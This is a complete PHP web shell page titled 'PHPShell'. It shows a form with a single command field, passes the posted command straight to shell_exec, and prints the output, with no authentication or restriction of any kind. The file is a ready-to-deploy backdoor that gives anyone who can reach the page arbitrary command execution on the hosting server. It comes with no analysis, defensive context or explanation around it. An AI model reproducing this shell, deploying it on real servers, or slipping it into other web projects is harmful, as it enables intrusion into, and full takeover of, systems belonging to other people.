<!DOCTYPE html>
<html>
	<head>

	<title>PHPShell</title>
	<meta charset="UTF-8" />

	</head>
	
		<style>

				a{
					text-decoration: none;
					color: black;
					font-size: 150%
				}

				p{
					text-decoration: none;
					color: black;
					font-size: 150%
				}

				fieldset{
					border:2px solid black;
					-moz-border-radius:8px;
					-webkit-border-radius:8px;
					border-radius:8px;
				}

				hr{

					height: 1px;
					background-color: #000000;
					border: none;
				}
				.inputt{
					height: 25px;
					width: 1000px;
				}
				input{
					height: 25px;
					width: 70px;
				}
			</style>
	<body>

	<fieldset>	
		<form action="" method="post">
			<p> <input type="text", class="inputt" name="command" size="100" rows="100" /> <input type="submit" value="execute"></p>
		</form>
			<hr>
		<?php

			if (isset($_POST['command'])) 
			{
				$command =  $_POST['command'];
				echo "<a><pre>".shell_exec($command)."</pre></a>";
			}
			else{
				echo "No command specified";
			}
		?>
	</fieldset>
	<body>
</html>
